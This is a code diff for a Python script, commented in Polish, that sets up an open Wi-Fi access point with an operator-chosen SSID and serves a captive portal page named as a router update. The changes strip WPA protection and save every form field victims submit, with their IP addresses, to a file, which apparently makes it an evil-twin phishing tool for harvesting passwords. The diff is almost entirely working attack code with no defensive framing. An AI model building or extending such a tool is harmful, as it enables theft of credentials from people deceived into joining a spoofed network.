@@ -8,6 +8,7 @@ import threading
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import logging
+from urllib.parse import parse_qs
 
 # Konfiguracja logowania
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -27,6 +28,7 @@ LEASE_TIME = "12h"
 
 PORTAL_HTML = None
 PORTAL_HTML_PATH = os.path.join(os.path.dirname(__file__), "Router_update_v2.html")
+CAPTURE_FILE_PATH = None
 
 # HTML dla captive portal - miejsce na base64
 HTML_PAGE = """<!DOCTYPE html>
@@ -125,6 +127,77 @@ def load_portal_html():
     return HTML_PAGE
 
 
+def get_interface_chipset(interface):
+    try:
+        result = subprocess.run(
+            ["ethtool", "-i", interface],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            text=True,
+            check=False,
+        )
+    except FileNotFoundError:
+        return "unknown"
+
+    if result.returncode != 0:
+        return "unknown"
+
+    driver = None
+    bus_info = None
+    for line in result.stdout.splitlines():
+        if line.startswith("driver:"):
+            driver = line.split(":", 1)[1].strip()
+        if line.startswith("bus-info:"):
+            bus_info = line.split(":", 1)[1].strip()
+
+    if driver and bus_info and bus_info != "":
+        return f"{driver} ({bus_info})"
+    if driver:
+        return driver
+    return "unknown"
+
+
+def list_network_interfaces():
+    interfaces = []
+    ip_link = subprocess.run(['ip', '-o', 'link', 'show'], stdout=subprocess.PIPE, text=True, check=False)
+    for line in ip_link.stdout.splitlines():
+        if ": " in line:
+            name = line.split(": ", 1)[1].split(":", 1)[0]
+            if name and name != "lo":
+                interfaces.append(name)
+    return interfaces
+
+
+def select_interface(interfaces):
+    if not interfaces:
+        logging.error("No network interfaces found.")
+        sys.exit(1)
+
+    logging.info("Available interfaces:")
+    for index, name in enumerate(interfaces, start=1):
+        chipset = get_interface_chipset(name)
+        logging.info("  %d) %s - %s", index, name, chipset)
+
+    while True:
+        choice = input("Select AP interface (number or name): ").strip()
+        if not choice:
+            logging.warning("Please select an interface.")
+            continue
+        if choice.isdigit():
+            idx = int(choice)
+            if 1 <= idx <= len(interfaces):
+                return interfaces[idx - 1]
+        if choice in interfaces:
+            return choice
+        logging.warning("Invalid selection. Try again.")
+
+
+def sanitize_filename(name):
+    sanitized = name.replace(os.sep, "_")
+    if os.altsep:
+        sanitized = sanitized.replace(os.altsep, "_")
+    return sanitized
+
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     PORTAL_PATHS = {
         "/",
@@ -150,7 +223,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         """Handle GET requests - display login page"""
-        print(f"[{datetime.now()}] GET request from {self.client_address[0]} to {self.path}")
+        logging.info("Portal connection from %s to %s", self.client_address[0], self.path)
 
         if self.path in self.PORTAL_PATHS:
             if self.path in {"/generate_204", "/gen_204", "/redirect", "/connecttest.txt", "/ncsi.txt"}:
@@ -169,10 +242,24 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         self.wfile.write(html_content.encode('utf-8'))
 
     def do_POST(self):
-        # Obsługa logowania
-        content_length = int(self.headers['Content-Length'])
+        """Store submitted form data."""
+        content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
-        logging.info(f"POST data: {post_data}")
+        decoded = post_data.decode("utf-8", errors="replace")
+        parsed = parse_qs(decoded)
+        logging.info("Portal submission from %s", self.client_address[0])
+
+        if CAPTURE_FILE_PATH:
+            timestamp = datetime.now().isoformat(sep=" ", timespec="seconds")
+            with open(CAPTURE_FILE_PATH, "a", encoding="utf-8") as capture_file:
+                capture_file.write(f"[{timestamp}] {self.client_address[0]}\n")
+                if parsed:
+                    for key, values in parsed.items():
+                        for value in values:
+                            capture_file.write(f"{key}={value}\n")
+                else:
+                    capture_file.write(decoded + "\n")
+                capture_file.write("\n")
         
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
@@ -214,11 +301,6 @@ wmm_enabled=0
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
-wpa=2
-wpa_passphrase={AP_PASSWORD}
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP
-rsn_pairwise=CCMP
 """
         
         with open('/tmp/hostapd.conf', 'w') as f:
@@ -315,31 +397,24 @@ def main():
         sys.exit(1)
     
     # Sprawdź dostępność wymaganych narzędzi
-    required_tools = ['hostapd', 'dnsmasq', 'iptables', 'ip']
+    required_tools = ['hostapd', 'dnsmasq', 'iptables', 'ip', 'ethtool']
     for tool in required_tools:
         if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
             logging.error(f"Required tool '{tool}' not found!")
             sys.exit(1)
     
-    # Wybór interfejsów
-    interfaces = []
-    ip_link = subprocess.run(['ip', '-o', 'link', 'show'], stdout=subprocess.PIPE, text=True, check=False)
-    for line in ip_link.stdout.splitlines():
-        if ": " in line:
-            name = line.split(": ", 1)[1].split(":", 1)[0]
-            if name and name != "lo":
-                interfaces.append(name)
+    # Wybór interfejsu AP
+    interfaces = list_network_interfaces()
+    globals()["AP_INTERFACE"] = select_interface(interfaces)
 
-    if interfaces:
-        logging.info("Available interfaces: %s", ", ".join(interfaces))
+    # Nazwa sieci
+    ssid_choice = input(f"Network name (SSID) [{AP_SSID}]: ").strip()
+    if ssid_choice:
+        globals()["AP_SSID"] = ssid_choice
 
-    ap_choice = input(f"AP interface [{AP_INTERFACE}]: ").strip()
-    if ap_choice:
-        globals()["AP_INTERFACE"] = ap_choice
-
-    internet_choice = input(f"Internet interface [{INTERNET_INTERFACE}]: ").strip()
-    if internet_choice:
-        globals()["INTERNET_INTERFACE"] = internet_choice
+    capture_filename = sanitize_filename(AP_SSID)
+    globals()["CAPTURE_FILE_PATH"] = os.path.join(os.path.dirname(__file__), capture_filename)
+    logging.info("Capturing portal submissions in: %s", CAPTURE_FILE_PATH)
 
     # Rejestruj cleanup przy wyjściu
     import atexit
@@ -361,7 +436,7 @@ def main():
         logging.info("=" * 50)
         logging.info(f"Captive Portal is running!")
         logging.info(f"SSID: {AP_SSID}")
-        logging.info(f"Password: {AP_PASSWORD}")
+        logging.info("Network is open (no password).")
         logging.info(f"Connect to WiFi and open any website to see the portal")
         logging.info("=" * 50)
         logging.info("Press Ctrl+C to stop")
